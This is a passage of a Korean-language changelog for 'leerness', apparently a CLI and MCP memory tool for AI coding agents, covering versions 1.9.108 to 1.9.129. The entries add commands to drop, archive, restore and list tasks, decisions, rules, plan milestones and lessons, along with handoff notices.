**handoff 7번째 자동 회수 — 🗑 최근 24h archive 알림** — DELETE 5종 archive 활동을 매 세션 시작 시 자동 노출.

### Added — handoff archive 알림
- handoff 출력에 archive 활동 라인 추가:
  ```
  🗑 최근 24h archive (1.9.129): D2/L1/P0 (3건 archived) — 복원 후보
    → 회수: leerness memory archive list --json
    → 복원: leerness memory restore <surface> <target>
  ```
- 3 archive 파일 (`decisions.archive.md`, `lessons.archive.md`, `plan.archive.md`) 의 mtime 24h 내 + entry date 24h 내만 카운트
- `--no-mem-delta` / `--compact` / `--quiet` / `LEERNESS_NO_MEM_DELTA=1` 로 끄기

### 7개 handoff 자동 회수
| # | 라운드 | 자동 회수 |
|---|---|---|
| 1 | (기존) | lessons matching |
| 2 | 1.9.45 | skill match 추천 |
| 3 | 1.9.69 | history hit |
| 4 | 1.9.88 | brainstorm hits |
| 5 | 1.9.81 | 통합 헤드라인 |
| 6 | 1.9.121 | 🆕 24h 메모리 변동 |
| **7** | **1.9.129** | **🗑 24h archive 알림** |

### 사용 시나리오
세션 시작 시 handoff:
```
🆕 최근 24h 메모리 변동 (1.9.121): task +3 · decision +1 · plan: 변경됨
🗑 최근 24h archive (1.9.129): D1/L0/P1 (2건 archived) — 복원 후보
  → 회수: leerness memory archive list --json
  → 복원: leerness memory restore <surface> <target>
```
AI 가 즉시 "어제 PostgreSQL 결정 취소했었네 — 다시 검토해야 할까?" 판단 가능.

## 1.9.128 — 2026-05-20

**`leerness memory restore` CLI + MCP 40번째 도구 `leerness_memory_restore`** 🎉 **MCP 40 도구 마일스톤** — DELETE→RESTORE cycle 완성.

### Added — `leerness memory restore <surface> <target>` CLI
- surface: `decisions` | `lessons` | `plan`
- target: date YYYY-MM-DD 또는 substring 매칭
- archive 의 매칭 블록을 active 파일 끝에 복귀
- archive 에서 제거 (또는 다 비면 헤더만 남김)
- 여러 매칭 동시 복원 가능
- Invalid surface / 미매칭 → fail

### Added — MCP 40번째 도구 `leerness_memory_restore` 🎉
- 외부 AI 가 직접 archive 복원
- 인자: `{ surface (required), target (required), path? }`

### DELETE → RESTORE cycle 완성
1. `decision drop "PostgreSQL"` → 제거 + archive
2. `memory archive list --surface decisions` → 후보 회수
3. `memory restore decisions "PostgreSQL"` → 복원

### 사용 시나리오
사용자: "어제 잘못 취소한 PostgreSQL 결정 다시 살려줘"
→ 외부 AI: `leerness_memory_restore({ surface: "decisions", target: "PostgreSQL" })` — archive에서 active로 복귀

### MCP 도구 누계: 40 🎉 (1.9.127: 39 + leerness_memory_restore — MCP 40 마일스톤)

## 1.9.127 — 2026-05-20

**`leerness memory archive list` CLI + MCP 39번째 도구 `leerness_memory_archive_list`** — DELETE 5종 archive 통합 조회 (decisions/lessons/plan).

### Added — `leerness memory archive list` CLI
- DELETE 5종 archive 파일 (`.harness/decisions.archive.md`, `lessons.archive.md`, `plan.archive.md`) 통합 조회
- 각 archive entry 파싱: `{ date, target, originalHeader }`
- `--surface decisions|lessons|plan` 필터 지원
- `--json` 옵션 — totals + 각 surface 별 entries
- archive 파일 없으면 안내 메시지

### Added — MCP 39번째 도구 `leerness_memory_archive_list`
- 외부 AI 가 과거에 제거된 항목 회수 — 복원 후보 참조 / 의사결정 변경 흐름 추적.
- 인자: `{ surface?, path? }` (surface optional)

### 사용 시나리오
1. **복원 후보 회수**: "이전에 PostgreSQL 채택 결정 취소했었지? 어떤 게 있었나"
   → 외부 AI: `leerness_memory_archive_list({ surface: "decisions" })` — 모든 제거된 결정 회수
2. **의사결정 변경 패턴 분석**: 자주 변경되는 surface 의 빈도 추적
3. **복구**: archive entry 참조 후 다시 `decision add` 로 재등록

### MCP 도구 누계: 39 (1.9.126: 38 + leerness_memory_archive_list)

## 1.9.126 — 2026-05-20

**`leerness plan remove <target>` CLI + MCP 38번째 도구 `leerness_plan_remove`** — milestone 블록 영구 제거 (archive 자동 보존). **Memory Surface DELETE 5종 완전 완성** 🎉

### Added — `leerness plan remove <target>` CLI
- target: M-XXXX 또는 title substring (예: `plan remove M-0003`, `plan remove "alpha"`)
- 매칭된 milestone 블록 (`### M-XXXX. 제목 …`) 을 plan.md 에서 영구 제거
- 제거된 블록은 `.harness/plan.archive.md` 에 자동 보존 (복구 가능)
- **template 블록 자동 보호** (`### Template`, `### 템플릿` 등은 제거 대상에서 제외)
- 매칭 없을 시 fail (`매칭 milestone 없음`)
- 기존 `plan drop` (Out of Scope 표 추가, 소프트 폐기) 와는 별개. `plan remove` 는 하드 제거.

### Added — MCP 38번째 도구 `leerness_plan_remove`
- 외부 AI 가 잘못 저장한 milestone 제거.
- 인자: `{ target (required), path? }`

### 사용 시나리오
사용자: "M-0007 마일스톤 잘못 등록했으니 제거해줘"
→ 외부 AI: `leerness_plan_remove({ target: "M-0007" })` — plan.md 에서 제거, archive 보존

### Memory Surface DELETE 5종 완전 완성 🎉
| Surface | DELETE 명령 | 라운드 |
|---|---|---|
| tasks (progress-tracker.md) | `task drop` | 1.9.107 |
| decisions.md | `decision drop` | 1.9.125 |
| rules.md | `rule remove` | (기존) |
| **plan.md** | **`plan remove`** | **1.9.126 ✓** |
| lessons.md | `lesson drop` | 1.9.124 |

전 Surface 가 CREATE/READ/DELETE 대칭 구조 완비.

### MCP 도구 누계: 38 (1.9.125: 37 + leerness_plan_remove)

## 1.9.125 — 2026-05-20

**`leerness decision drop <target>` CLI + MCP 37번째 도구 `leerness_decision_drop`** — 잘못 저장한 결정 제거 (archive 자동 보존).

### Added — `leerness decision drop <target>` CLI
- target: date `YYYY-MM-DD` 또는 title substring
- 매칭된 결정 블록을 decisions.md 에서 제거
- 제거된 블록은 `.harness/decisions.archive.md` 에 자동 보존 (복구 가능)
- **template 블록 자동 보호** (`### Template` 등은 제거 대상에서 제외)
- 매칭 없을 시 fail

### Added — MCP 37번째 도구 `leerness_decision_drop`
- 외부 AI 가 잘못 저장한 결정 제거.
- 인자: `{ target (required), path? }`

### 사용 시나리오
사용자: "어제 PostgreSQL 결정 취소하고 MySQL로 다시 검토하자"
→ 외부 AI: 
  1. `leerness_decision_drop({ target: "PostgreSQL" })` — 기존 제거 (archive 보존)
  2. `leerness_decision_add({ title: "MySQL 채택", reason: "...", ... })` — 새 결정 등록

### Memory CRUD 진화 (decisions)
| Operation | 라운드 |
|---|---|
| CREATE (add) | 1.9.108 |
| READ (list) | 1.9.118 |
| **DELETE (drop)** | **1.9.125 ✓** |

### Memory Surface Archive 패턴 (2종)
- `lessons.archive.md` (1.9.124)
- `decisions.archive.md` (1.9.125)

### MCP 도구 수: 36 → 37개

### Verified
- stress-v70 — decision drop (date/title) + archive 보존 + template 보호 + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.124 — 2026-05-20

**`leerness lesson drop <target>` CLI + MCP 36번째 도구 `leerness_lesson_drop`** — 잘못 저장한 lesson 제거 (archive 자동 보존).

### Added — `leerness lesson drop <target>` CLI
- 새 명령: `leerness lesson drop "2026-05-20"` (date 매칭) 또는 `leerness lesson drop "JWT"` (text substring 매칭)
- 매칭된 lesson 블록을 lessons.md 에서 제거
- 제거된 블록은 `.harness/lessons.archive.md` 에 자동 보존 (복구 가능)
- 매칭 없을 시 `fail` (exit 1)

### Added — MCP 36번째 도구 `leerness_lesson_drop`
- 외부 AI 가 잘못 저장한 lesson 제거.
- 인자: `{ target (required), path? }`
- target은 date 또는 text substring 둘 다 매칭 (정확 date 우선)

### 사용 시나리오
사용자: "어제 잘못 저장한 lesson 지워줘. webhook 관련이었어"
→ 외부 AI: `leerness_lesson_drop({ target: "webhook" })`
→ "lesson dropped: 1건 (보존: .harness/lessons.archive.md)"

### Memory CRUD 확장
| 영역 | CREATE | READ | UPDATE | DELETE |
|---|---|---|---|---|
| Tasks | task_add | task_export | task_update | task_drop |
| Decisions | decision_add | decision_list | — | — |
| Rules | rule_add | rule_list | (status pause/resume) | rule_remove |
| Plan | plan_add | plan_list | — | — |
| **Lessons** | lesson_save | lesson_list | — | **lesson_drop ✓ (1.9.124)** |

### MCP 도구 수: 35 → 36개

### Verified
- stress-v69 — lesson drop (date/text) + archive 보존 + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.123 — 2026-05-20

**`leerness health --json` 응답에 `memorySurface` 필드 통합** — handoff (1.9.115) / session close (1.9.122) / memory status (1.9.114) 와 일관성 완성.

### Added — `health --json` 새 필드 `memorySurface`
```json
{
  "root": "...",
  "generatedAt": "...",
  "checks": { "drift": ..., "security": ..., "skills": ..., "usage": ..., "tasks": ... },
  "issues": [...],
  "healthy": true,
  "memorySurface": {
    "tasks": { "inProgress": 2, "total": 12, "byStatus": {...} },
    "decisions": { "count": 4 },
    "rules": { "active": 2, "total": 2 },
    "plan": { "milestones": 3 },
    "lessons": { "count": 7 },
    "summary": "T2/D4/R2/P3/L7"
  }
}
```

### 1.9.123 — JSON 명령 4종 일관성
| 명령 | memorySurface 필드 | 라운드 |
|---|---|---|
| `handoff --json` | ✓ | 1.9.115 |
| `memory status --json` | ✓ (상세 + latest) | 1.9.114 |
| `session close --json` | ✓ | 1.9.122 |
| **`health --json`** | **✓** | **1.9.123 ✓** |

이제 외부 AI 가 어떤 JSON 명령을 호출해도 동일한 `memorySurface` 구조로 5종 메모리 상태 회수.

### Verified
- stress-v68 — health --json memorySurface + summary 포맷 + 카운트 + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.122 — 2026-05-20

**`session close --json` 응답에 `memorySurface` 필드 통합** — handoff --json (1.9.115) 패턴을 session close 에도 적용.

### Added — `session close --json` 새 필드 `memorySurface`
이미 1.9.103 에서 추가된 `session close --json` 응답 구조에 `memorySurface` 통합:
```json
{
  "version": "1.9.122",
  "closedAt": "...",
  "sessionNumber": 62,
  "taskCounts": { ... },
  "rules": [...],
  "skillCandidates": [...],
  "drift": { ... },
  "topCommands": [...],
  "mcpStats": { ... },
  "workspacePeers": 29,
  "memorySurface": {
    "tasks": { "inProgress": 2, "total": 12, "byStatus": {...} },
    "decisions": { "count": 4 },
    "rules": { "active": 2, "total": 2 },
    "plan": { "milestones": 3 },
    "lessons": { "count": 7 },
    "summary": "T2/D4/R2/P3/L7"
  }
}
```

### 1.9.122 의 가치
- 외부 AI (Claude Code / Hermes) 가 session 마감 시 단일 `session close --json` 호출로:
  - 기존: 마감 통계 + drift + skill 후보
  - **추가: 5종 메모리 영구화 상태 (Memory Write Surface 카운트)**
- handoff (1.9.115) 와 session close (1.9.122) 모두 동일 `memorySurface` 패턴.
- MCP `leerness_session_close` 응답도 자동 갱신.

### Verified
- stress-v67 — session close --json memorySurface 필드 + 카운트 정확성 + summary 포맷 + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.121 — 2026-05-20

**handoff 6번째 자동 회수 라인 — `🆕 최근 24h 메모리 변동`** (5종 surface 24h 내 추가 항목 알림).

### Added — handoff 자동 회수 6단째
handoff 호출 시 다음 라인 자동 추가 (24h 내 메모리 surface 변경이 있을 때만):
```
🆕 최근 24h 메모리 변동 (1.9.121): decision +2 · lesson +1 · rule +1 · plan: 변경됨
  → 상세: leerness memory status --json
```

### 조건
다음 영역의 mtime 이 24h 내 또는 today() 날짜 항목이 있으면 표시:
- **task** — progress-tracker.md `Updated:` 컬럼 24h 내 row 카운트
- **decision** — decisions.md `### YYYY-MM-DD` 헤더 중 오늘 날짜
- **lesson** — lessons.md `### YYYY-MM-DD` 헤더 중 오늘 날짜
- **plan** — plan.md mtime 24h 내 (변경됨 표시)
- **rule** — rules.md mtime 24h 내 + `added: today()` rule 카운트

### 끄기
- `--no-mem-delta`
- `LEERNESS_NO_MEM_DELTA=1`
- `--quiet` 또는 `--compact` 모드에서는 자동 비활성

### 1.9.121 의 가치
- AI 에이전트가 이전 세션 종료 후 어떤 메모리가 추가됐는지 **즉시 인지**.
- 사용자 워크플로: "어제 등록한 결정과 통찰이 이번 세션 시작 시 보이게" → 자동 달성.
- 1.9.113 (헤드라인 mem 카운트) 와 보완 — 카운트가 아니라 **delta** 표시.

### handoff 자동 회수 6단 완성
| # | 라인 | 라운드 |
|---|---|---|
| 1 | 🧠 lessons 자동 재상기 | 1.9.56/67 |
| 2 | 🎯 매칭되는 skill 자동 추천 | 1.9.67 |
| 3 | 📒 이전 skill match 이력 | 1.9.69 |
| 4 | 🧩 brainstorm 자동 hits | 1.9.88 |
| 5 | 📊 통합 헤드라인 (mem T/D/R/P/L) | 1.9.81/93/113 |
| **6** | **🆕 최근 24h 메모리 변동** | **1.9.121 ✓** |

### Verified
- stress-v66 — handoff 6단 라인 + delta 카운트 정확성 + --no-mem-delta 비활성 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.120 — 2026-05-20 🏆 50 라운드 자율 모드 마일스톤

**50 라운드 자율 모드 누적 마일스톤 보고서** (`_reports/AUTONOMOUS_ROUNDS_1.9.70-1.9.119.md`) + stress-v65 종합.

### Internal — 비공개 종합 보고서
- `_reports/AUTONOMOUS_ROUNDS_1.9.70-1.9.119.md` — **50 라운드** 종합 분석 (1.9.70 ~ 1.9.119)
- MCP 도구 진화 (10 → 35, 25개 추가)
- **Memory Surface 5종 R/W 완전 대칭** (WRITE 5종 + LIST READ 5종 = 10 surfaces)
- JSON 옵션 18종 누적
- 보안 4중 가드 + audit 11 kind
- 디버그 기록 8건 (1차 실패 → PASS 회복)
- 성능 측정 (11개 명령 median)
- 사용자 명시 정책 7개 모두 ✓

### 🏆 마일스톤 진화 요약
- 1.9.89: 19 라운드 보고서
- 1.9.97: 27 라운드 보고서
- 1.9.100: 🏆 30 라운드 + 100번째 패치
- 1.9.110: 🎉 MCP 30 도구 + Memory WRITE 5종
- 1.9.111: 41 라운드 보고서
- 1.9.119: 🎯 Memory READ 5종 완성
- **1.9.120: 🏆 50 라운드 마일스톤**

### Verified — stress-v65 종합 (1.9.70~119 핵심 기능 회귀)
- Memory Surface 5종 R/W 모두 PASS
- MCP 35 도구 노출 ✓
- handoff 5단 자동 회수 + 헤드라인 ✓
- 보안 4중 가드 ✓
- e2e 219/219 PASS

### Badge
- README `autonomous-rounds-50` (blueviolet 강조)

---

## 1.9.119 — 2026-05-20 🎯 Memory Surface READ 5종 완전 완성

**`leerness plan list [--json]` + MCP 35번째 도구 `leerness_plan_list`** — plan.md milestone 전체 조회 (Status/Progress/Tasks 체크박스 포함).

### Added — `leerness plan list [--json]`
- 새 CLI: `.harness/plan.md` 의 모든 milestone (M-XXXX) 조회.
- 출력: `{ id, title, status, progress, tasks: [{ done, text }] }`
- JSON: `{ version, root, total, milestones[] }`
- Tasks 체크박스 (`- [ ]` / `- [x]`) 자동 파싱 → 완료/미완료 카운트.

### Added — MCP 35번째 도구 `leerness_plan_list`
- 외부 AI 가 영구화된 milestone + Tasks 진행 상태 회수.
- 인자: `{ path? }`

### 🎯 Memory Surface READ 5종 완전 완성
| 영역 | READ 명령 | 라운드 |
|---|---|---|
| Tasks | task export | 1.9.60 |
| Rules | rule list | 1.9.109 |
| Lessons | lesson list | 1.9.117 |
| Decisions | decision list | 1.9.118 |
| **Plan** | **plan list** | **1.9.119 ✓** |

Memory Surface 5종은 이제 WRITE (1.9.105~112) + LIST READ (1.9.60~119) 패턴 완전 대칭:

| 영역 | WRITE | LIST READ |
|---|---|---|
| Tasks | task_add/update/drop (1.9.105~107) | task_export (1.9.60) |
| Decisions | decision_add (1.9.108) | decision_list (1.9.118) |
| Rules | rule_add (1.9.109) | rule_list (1.9.109) |
| Plan | plan_add (1.9.110) | **plan_list (1.9.119)** |
| Lessons | lesson_save (1.9.112) | lesson_list (1.9.117) |

### MCP 도구 수: 34 → 35개
### JSON 옵션 누적: 17 → 18종

### Verified
- stress-v64 — plan list CLI + --json + status/progress/tasks 파싱 + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.118 — 2026-05-20

**`leerness decision list [--json]` 새 명령 + MCP 34번째 도구 `leerness_decision_list`** — decisions.md 전체 조회 + 메타데이터.

### Added — `leerness decision list [--json]`
- 새 CLI: `.harness/decisions.md` 의 모든 설계 결정 조회.
- 출력: `{ date, title, decision, reason, alternatives, impact }`
- JSON: `{ version, root, total, decisions[] }`
- `_extractDecisionBlocks` 사용 → template/code 블록 자동 제외.

### Added — MCP 34번째 도구 `leerness_decision_list`
- 외부 AI 가 영구화된 설계 결정 + 메타데이터 (Reason/Alternatives/Impact) 전체 회수.
- 인자: `{ path? }`

### 사용 시나리오
사용자: "지금까지 등록된 결정들 알려줘"
→ 외부 AI: `leerness_decision_list({ path: "." })`
→ `[{ date, title, reason, alternatives, impact }, ...]` 전체 조회

### Memory Surface READ 확장 (4종 모두 list 명령 존재)
| 영역 | READ 명령 | 라운드 |
|---|---|---|
| Tasks | task export | 1.9.60 |
| Rules | rule list | 1.9.109 |
| Lessons | lesson list | 1.9.117 |
| **Decisions** | **decision list** | **1.9.118 ✓** |

(Plan은 plan progress가 기존 존재 — milestone 진행률 보고)

### MCP 도구 수: 33 → 34개
### JSON 옵션 누적: 16 → 17종

### Verified
- stress-v63 — decision list CLI + --json + 메타데이터 + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.117 — 2026-05-20

**`leerness lesson list [--tag] [--json]` 새 명령 + MCP 33번째 도구 `leerness_lesson_list`** — lessons.md 전용 조회 + tag 필터.

### Added — `leerness lesson list [--tag <tag>] [--json]`
- 새 CLI: `.harness/lessons.md` 의 모든 lesson 조회.
- 옵션:
  - `--tag <tag>` — 특정 태그 필터 (lesson save 시 `--tag` 로 저장된 값)
  - `--json` — 구조화 출력
- JSON 출력: `{ version, root, total, lessons: [{ date, text, tag }], tag? }`

### Added — MCP 33번째 도구 `leerness_lesson_list`
- 외부 AI 가 영구화된 lesson 전체 회수.
- `leerness_lessons` 와 차이:
  - `lessons`: review-evidence / decisions / task-log / lessons.md 다중 source fuzzy 매칭
  - `lesson_list`: **lessons.md 전용** (사용자가 명시 save 한 lesson만) + tag 필터
- 인자: `{ path?, tag? }`

### 사용 시나리오
사용자: "지금까지 등록된 auth 관련 lesson 알려줘"
→ 외부 AI: `leerness_lesson_list({ tag: "auth" })`
→ `{ total: 3, lessons: [{ date, text, tag: "auth" }, ...] }`

### Memory Surface READ 확장
| 영역 | READ | 라운드 |
|---|---|---|
| Tasks | task export | 1.9.60 |
| Decisions | (lessons fuzzy + memory status 최근) | 기존 |
| Rules | rule list | 1.9.109 |
| Plan | (handoff 컨텍스트) | 기존 |
| **Lessons** | **lesson list** | **1.9.117 ✓** |

### MCP 도구 수: 32 → 33개
### JSON 옵션 누적: 15 → 16종

### Verified
- stress-v62 — lesson list CLI + --tag 필터 + --json + MCP + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.116 — 2026-05-20

**`leerness brainstorm` 회수 범위에 lessons.md + plan.md milestone 통합** — Memory Write Surface 5종 ↔ brainstorm 완전 통합.

### Added — brainstorm 회수 범위 확장
- 기존 hits 영역: decisions / skills / tasks / rules / evidence / skillHistory / taskLogFails
- **추가 hits**: 
  - `lessonsExplicit` — `.harness/lessons.md` (1.9.112 신규) 의 dated 블록 매칭
  - `planMilestones` — `.harness/plan.md` 의 `M-XXXX` milestone 매칭

### 변경 적용 위치
- `_brainstormFor(root, topic)` — 1.9.77 MCP `leerness_brainstorm` + 1.9.88 handoff brainstorm hits 가 사용
- `brainstormCmd(root, topic)` verbose 출력 — 사용자 직접 호출 시 발견 카운트에 포함

### 1.9.116 의 가치
- 1.9.112 에서 lessons.md 가 메모리 surface 5번째로 추가됐지만 brainstorm 매칭에는 미반영.
- 이제 brainstorm 호출 시 lessons.md 의 통찰 + plan.md 의 milestone 도 함께 검색.
- 외부 AI 가 "JWT" 주제로 brainstorm 호출 → JWT 관련 모든 메모리 surface (decision/lesson/plan/rule/skill/task/history/failure) 자동 회수.

### Performance
- 새 hits 영역 추가로 brainstorm 평균 5-10ms 증가 (lessons.md, plan.md 추가 read).
- 캐시 미적용 (단순 텍스트 매칭) — 향후 캐싱 가능.

### Verified
- stress-v61 — brainstorm --json 에 lessonsExplicit/planMilestones 필드 존재 + 키워드 매칭 정확성 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.115 — 2026-05-20

**`leerness handoff --json` 응답에 `memorySurface` 필드 통합** — 단일 호출로 컨텍스트 + 5종 메모리 상태 동시 회수.

### Added — `handoff --json` 새 필드 `memorySurface`
출력 구조에 다음 필드 추가:
```json
{
  "date": "...",
  "project": "...",
  "version": "1.9.115",
  "files": { ... },
  "activeRules": [ ... ],
  "memorySurface": {
    "tasks": { "inProgress": 2, "total": 12, "byStatus": {...} },
    "decisions": { "count": 4 },
    "rules": { "active": 2, "total": 2 },
    "plan": { "milestones": 3 },
    "lessons": { "count": 7 },
    "summary": "T2/D4/R2/P3/L7"
  }
}
```

### 1.9.115 의 가치
- 외부 AI(Claude Code / Hermes)가 매 세션 시작 시 단일 `handoff --json` 호출만으로:
  - 워크스페이스 컨텍스트 (plan / progress / decisions / handoff 등 파일)
  - active rules
  - **5종 메모리 영구화 상태 (Memory Write Surface)**
  를 모두 한 번에 회수.
- MCP `leerness_handoff` 응답도 자동 갱신 (기존 도구가 --json 사용).

### 1.9.114 와 차이
- 1.9.114: 별도 `memory status` 명령으로 상세 조회 + 최근 항목까지.
- **1.9.115**: handoff 응답에 통합 — 별도 호출 없이 동시 수신 (latest 항목은 제외, 카운트만).

### Verified
- stress-v60 — handoff --json memorySurface 필드 + 카운트 정확성 + summary 포맷 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.114 — 2026-05-20

**`leerness memory status` 새 명령 + MCP 32번째 도구 `leerness_memory_status`** — Memory Write Surface 5종 통합 상세 상태 조회.

### Added — `leerness memory status [--json]`
- 새 CLI 명령: Memory Write Surface 5종 통합 상태 조회.
- Verbose 모드:
  ```
  # 🧠 Memory Surface Status (1.9.114)
  📋 Tasks: 2 in-progress / 12 total
     - 분포: in-progress=2, done=8, ...
  🧠 Decisions: 4 entries
     - 최근: 2026-05-20 — PostgreSQL 채택
  ⚡ Rules: 2 active / 0 paused
  🗺  Plan: 3 milestones (1 in-progress)
  💡 Lessons: 7 entries
     - 최근: webhook 재시도 시 idempotency key 필수

  📊 Summary: T2/D4/R2/P3/L7
  ```
- JSON 모드: `{ version, root, tasks, decisions, rules, plan, lessons, summary }` 구조.
- summary 필드는 handoff 헤드라인 (1.9.113) 과 동일 포맷 `T/D/R/P/L`.

### Added — MCP 32번째 도구 `leerness_memory_status`
- 외부 AI 가 한 호출로 5종 메모리 영구화 상태 + 카운트 + 최근 항목 회수.
- 인자: `{ path? }`.
- 1.9.113 헤드라인 mem 토큰의 상세 버전 — 외부 AI 가 카운트만 아닌 **최근 결정 / 최근 lesson 내용** 까지 직접 받음.

### 사용 시나리오
사용자: "지금까지 누적된 결정과 lesson 알려줘"
→ 외부 AI: `leerness_memory_status({ path: "." })`
→ 외부 AI 가 receivedJSON 으로 응답:
> "Decisions 4건, 최근: PostgreSQL 채택. Lessons 7건, 최근: webhook 재시도 시 idempotency key 필수."

### MCP 도구 수: 31 → 32개
### JSON 옵션 누적: 14 → 15종

### Verified
- stress-v59 — memory status CLI + --json + MCP 응답 + 5종 카운트 정확성 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.113 — 2026-05-20

**handoff 통합 헤드라인에 Memory Write Surface 5종 카운트 추가** — 사용자가 한눈에 5종 메모리 영구화 상태 확인.

### Added — `📊 헤드라인` 의 새 토큰 `🧠 mem T/D/R/P/L`
handoff 호출 시 통합 헤드라인 끝에 다음 토큰 추가:
- **T** — tasks in-progress 카운트
- **D** — decisions 누적 (decisions.md `### YYYY-MM-DD` 헤더 카운트)
- **R** — rules active 카운트
- **P** — plan milestones 누적 (`M-XXXX` 카운트)
- **L** — lessons 누적 (lessons.md `### YYYY-MM-DD` 헤더 카운트)

예: `📊 헤드라인 (1.9.81/93/113): drift healthy (0) · 🔒 보안 OK · 🔌 MCP 5회 · 📒 skill query 3회 · 📚 12 skills · ⚕ health: ✓ · 🧠 mem T2/D3/R1/P5/L7`

### 1.9.113 의 가치
- 외부 AI 가 매 handoff 호출 시 5종 메모리 surface 의 **영구화 상태**를 한 줄로 인지.
- "지금까지 등록된 decisions / lessons / plan milestones 가 얼마나 있나?" 를 한눈에.
- Memory Write Surface 5종 완성 (1.9.112) 의 자연스러운 가시화.

### Performance
- inline 계산 (자식 spawn 없음) — 헤드라인 latency 영향 무시 가능 (~ +5ms).

### Verified
- stress-v58 — handoff 헤드라인 mem 토큰 출현 + 5종 카운트 정확성 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.112 — 2026-05-20

**`leerness lesson save` CLI + MCP 31번째 도구 `leerness_lesson_save`** — **Memory Write Surface 5종 완성** (lessons.md 전용 직접 write).

### Added — `leerness lesson save "<text>"` CLI
- 새 명령: `leerness lesson save "<text>" --tag "..."`
- `.harness/lessons.md` 에 표준 형식으로 append:
  ```md
  ### YYYY-MM-DD
  - Lesson: <text>
  - Tag: <tag> (선택)
  ```
- lessons.md 가 없으면 자동 생성.

### Added — MCP 31번째 도구 `leerness_lesson_save`
- 외부 AI 가 세션 중 얻은 통찰을 즉시 영구 기록.
- 인자: `{ text (required), tag?, path? }`
- handoff 자동 lessons 회수와 통합 — 추후 동일 키워드 작업 시 자동 재상기.

### Memory Write Surface 5종 완성
| 영역 | WRITE 라운드 | MCP 도구 |
|---|---|---|
| Tasks (CRUD) | 1.9.105~107 | task_add/update/drop |
| Decisions | 1.9.108 | decision_add |
| Rules | 1.9.109 | rule_add/list |
| Plan | 1.9.110 | plan_add |
| **Lessons** | **1.9.112** | **lesson_save** |

### Internal — `_loadLessonsIndex()` 확장
- `lessons.md` 도 캐시 인덱스에 포함 → handoff 자동 회수 가 새 lessons 도 즉시 fuzzy 매칭.
- mtime 기반 캐시 무효화 (다른 파일과 동일 패턴).

### Fixed
- `nonFlagArgs()` withValue Set 에 `--tag` 추가 — `lesson save` CLI 인자 정확히 파싱.

### MCP 도구 수: 30 → 31개

### Verified
- stress-v57 — lesson save CLI + lessons.md 갱신 + MCP 31 도구 + handoff lessons 회수 통합 + Memory Write 5종 통합 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.111 — 2026-05-20

**41 라운드 자율 모드 누적 보고서 마무리** (`_reports/AUTONOMOUS_ROUNDS_1.9.70-1.9.110.md`) + stress-v56 종합 회귀.

### Internal — 비공개 종합 보고서
- `_reports/AUTONOMOUS_ROUNDS_1.9.70-1.9.110.md` — 41 라운드 (1.9.70~1.9.110) 종합 분석
- MCP 도구 진화 표 (10 → 30, 20개 추가)
- Memory Write Surface 4종 완성 (tasks CRUD + decisions + rules + plan)
- JSON 옵션 14종 누적
- 보안 3중 가드 + audit 11 kind
- 디버그 기록 7건
- 성능 측정 (11개 명령 median)
- 사용자 명시 정책 7개 모두 ✓

### Verified — stress-v56 종합 (1.9.70~110 핵심 기능 회귀)
- 마일스톤 (1.9.100/110) 핵심 시나리오 모두 PASS
- Memory Write Surface 4종 통합 사이클 PASS
- e2e 219/219 PASS

### Badge
- README 에 `autonomous-rounds-41` 배지 추가

---

## 1.9.110 — 2026-05-20 🎉 **MCP 30 도구 마일스톤**

**MCP 30번째 도구 `leerness_plan_add`** (plan.md milestone + progress-tracker 자동 동기화).

### Added — MCP 30번째 도구 `leerness_plan_add`
- 외부 AI 가 plan.md 에 새 milestone (`M-XXXX`) 추가.
- 자동으로 progress-tracker.md 에 동기화된 task (`T-XXXX`) 생성 + `evidence: plan:M-XXXX` 링크.
- 인자: `{ text (required), status?, progress?, nextAction?, path? }`
- 기본값: `status=planned`, `progress=0%`, `nextAction="다음 액션 작성"`

### Memory Write Surface 확장 (4종)
| 영역 | WRITE 라운드 | MCP 도구 |
|---|---|---|
| Tasks (CRUD) | 1.9.105~107 | task_add/update/drop |
| Decisions | 1.9.108 | decision_add |
| Rules | 1.9.109 | rule_add/list |
| **Plan** | **1.9.110** | **plan_add** |

### 🎉 MCP 30 도구 마일스톤 (1.9.43 → 1.9.110)
- **1.9.43**: 10 도구 (기본 MCP 도입)
- **1.9.94**: 21 도구 (skill_search/info, benchmark 추가)
- **1.9.107**: 26 도구 (task CRUD 완성)
- **1.9.110**: **30 도구 마일스톤** 🎉

### Verified
- stress-v55 — MCP plan_add + plan.md+progress-tracker 자동 동기화 + 30 도구 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.109 — 2026-05-20

**MCP 28+29번째 도구 `leerness_rule_add` / `leerness_rule_list`** + `rule list --json` (자연어 영구 룰 R/W).

### Added — `leerness rule list --json`
- 출력: `{ version, root, total, rules[] }`
- 각 rule: `{ id, trigger, rule, status, lastVerified }`
- CI/외부 AI 통합 친화.

### Added — MCP 28번째 도구 `leerness_rule_add`
- 외부 AI 가 자연어 영구 룰 (1.9.8) 등록.
- 인자: `{ description (required), trigger?, path? }`
- trigger enum: `every-session` / `every-update` / `every-commit` / `session-start` / `session-close` / `pre-publish`
- 등록된 룰은 매 handoff 자동 출력, session close 자동 검증.

### Added — MCP 29번째 도구 `leerness_rule_list`
- 외부 AI 가 현재 활성 룰 조회.
- 사용 시나리오: 사용자가 "현재 활성 룰 알려줘" → 외부 AI 가 자동 회수.

### Memory Write Surface 확장 (3종)
| 영역 | WRITE 라운드 |
|---|---|
| Tasks (CRUD) | 1.9.105~107 |
| Decisions | 1.9.108 |
| **Rules** | **1.9.109** |

### MCP 도구 수: 27 → 29개 (2개 추가)

### Verified
- stress-v54 — rule list --json + MCP rule_add/list + 29 도구 + 누적 회귀.
- e2e 219/219 PASS.

---

## 1.9.108 — 2026-05-20

**`leerness decision add` 새 CLI + MCP 27번째 도구 `leerness_decision_add`** (설계 결정 영구화 — task 다음으로 메모리 write surface 확장 시작).

### Added — `leerness decision add "<title>"` CLI
